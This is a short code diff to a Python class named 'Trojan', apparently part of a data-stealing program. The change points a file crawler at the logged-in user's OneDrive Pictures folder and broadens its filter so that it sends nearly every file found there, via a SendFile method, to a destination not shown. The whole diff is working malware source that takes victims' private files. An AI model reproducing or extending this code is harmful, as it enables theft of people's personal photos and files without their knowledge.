@@ -31,13 +31,14 @@ class Trojan:
                 pass
     
     def CrawlAllPng(self):
+        usname = os.getlogin()
         counter= 0
         inp = '.png'
         thisdir = os.getcwd()
-        for r, d, f in os.walk("C:\\"):
+        for r, d, f in os.walk(f"C:\\Users\\{usname}\\OneDrive\\Pictures"):
             for file in f:
                 filepath = os.path.join(r, file)
-                if inp in file:
+                if inp in file or '$' not in file:
                     counter += 1
                     self.SendFile(file=os.path.join(r, file))
 
